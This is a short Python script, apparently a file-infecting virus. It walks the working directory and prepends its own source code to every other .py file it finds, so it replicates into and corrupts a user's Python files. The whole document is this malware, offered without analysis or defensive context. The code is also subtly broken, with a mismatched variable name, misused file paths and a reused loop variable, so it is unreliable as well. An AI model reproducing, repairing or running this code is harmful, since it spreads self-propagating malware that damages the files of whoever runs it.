
import os
payload_filename = __file__
for root, dirs, files in os.walk(os.getcwd()):
    for f in files:
        if f.endswith('.py') and f != payload_filename:
            with open(f, 'r+') as f:
                target_host_content = f.read()
                f.seek(0, 0)
                with open(__file__) as virus:
                    virus_content = virus.read()
                    f.write(virus_content + host_content)
